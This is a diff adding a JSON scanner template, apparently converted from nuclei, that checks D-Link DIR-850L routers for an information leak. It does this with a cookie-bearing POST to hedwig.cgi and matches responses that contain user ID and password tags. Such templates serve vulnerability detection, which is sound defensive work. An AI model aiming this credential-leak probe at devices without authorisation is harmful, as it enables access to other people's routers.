@@ -1,0 +1,141 @@
+{
+  "id": "dlink-850L-info-leak",
+  "name": "Dlink Dir-850L Info Leak",
+  "author": "pikpikcu",
+  "severity": "INFO",
+  "description": "",
+  "references": [
+    "https://xz.aliyun.com/t/2941"
+  ],
+  "tags": [
+    "dlink"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "POST",
+      "path": "{{BaseURL}}/hedwig.cgi",
+      "headers": {
+        "Cookie": "uid\u003dR8tBjwtFc8",
+        "Content-Type": "text/xml"
+      },
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003c/usrid\u003e",
+            "\u003c/password\u003e"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "dlink-850L-info-leak",
+    "info": {
+      "name": "Dlink Dir-850L Info Leak",
+      "author": "pikpikcu",
+      "severity": "info",
+      "reference": [
+        "https://xz.aliyun.com/t/2941"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "dlink"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "POST",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/hedwig.cgi"
+        ],
+        "headers": {
+          "Cookie": "uid\u003dR8tBjwtFc8",
+          "Content-Type": "text/xml"
+        },
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003c/usrid\u003e",
+              "\u003c/password\u003e"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
